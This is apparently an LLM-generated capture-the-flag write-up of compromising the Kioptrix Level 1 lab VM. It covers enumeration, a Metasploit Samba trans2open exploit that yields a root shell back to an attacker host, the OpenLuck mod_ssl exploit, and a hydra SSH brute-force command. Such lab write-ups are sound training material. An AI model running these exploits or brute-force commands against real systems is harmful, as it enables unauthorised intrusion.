---
title: "Exploiting Kioptrix Level 1"
date: 2025-08-25
read: "20 min read"
tags: ["cybersecurity", "Pentest"]
---


> This writeup was generated using an LLM (Claude) based on penetration testing notes available at: [GitHub Repository Link]

**Target:** 10.0.2.3  
**Date:** October 14, 2025  
**Result:** Root access achieved  

## Network Discovery

```bash
netdiscover -r 10.0.2.0/24
```
Target identified at 10.0.2.3

## Port Scan

```bash
nmap -p- 10.0.2.3
```

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 2.9p2 |
| 80 | HTTP | Apache/1.3.20 |
| 111 | RPCbind | - |
| 139 | NetBIOS-SSN | Samba smbd |
| 443 | HTTPS | mod_ssl/2.8.4 OpenSSL/0.9.6b |
| 32768 | filenet-tms | - |

OS: Linux 2.4.X (Red Hat)

## Service Enumeration

### Web Server (80/443)

```bash
nikto -h 10.0.2.3
```

Findings:
- Apache/1.3.20 with mod_ssl/2.8.4
- mod_ssl vulnerable to remote buffer overflow (≤2.8.7)
- Directory indexing on /manual/ and /icons/
- 404 page discloses: `Apache/1.3.20 Server at 127.0.0.1 Port 80`

### SMB (139)

```bash
smbclient -L \\\\10.0.2.3\\
```

Output:
```
Server does not support EXTENDED_SECURITY
Anonymous login successful

Sharename       Type      Comment
---------       ----      -------
IPC$            IPC       IPC Service (Samba Server)
ADMIN$          IPC       IPC Service (Samba Server)

Server: KIOPTRIX
Workgroup: MYGROUP
```

Version identified: Samba 2.2.1a

Anonymous share access attempts:
```bash
smbclient \\\\10.0.2.3\\IPC$     # Connected
smbclient \\\\10.0.2.3\\ADMIN$   # NT_STATUS_WRONG_PASSWORD
```

### SSH (22)

OpenSSH 2.9p2 requires legacy algorithms:
```bash
ssh 10.0.2.3 -oKexAlgorithms=+diffie-hellman-group1-sha1 \
    -oHostKeyAlgorithms=+ssh-rsa -c aes128-cbc
```

## Exploitation

### Samba trans2open (CVE-2003-0201)

```bash
msfconsole

msf6 > use exploit/linux/samba/trans2open
msf6 > set RHOSTS 10.0.2.3
msf6 > set LHOST [attacker_ip]
msf6 > exploit

[*] Command shell session opened

whoami
root
```

### Apache mod_ssl Attempt (CVE-2002-0082)

```bash
git clone https://github.com/heltonWernik/OpenLuck
./OpenFuck 0x6b 10.0.2.3 -c 40
```
Connection established and non root shell obtained.

### SSH Brute Force Configuration

```bash
hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt \
    ssh://10.0.2.3:22 -t 4 -V
```
Not executed - other vectors successful.

## Summary

Root access obtained via Samba trans2open heap buffer overflow. System running:
- Samba 2.2.1a (2001)
- Apache 1.3.20 (2001)  
- OpenSSH 2.9p2 (2001)

Multiple critical vulnerabilities present due to 20+ year old software.
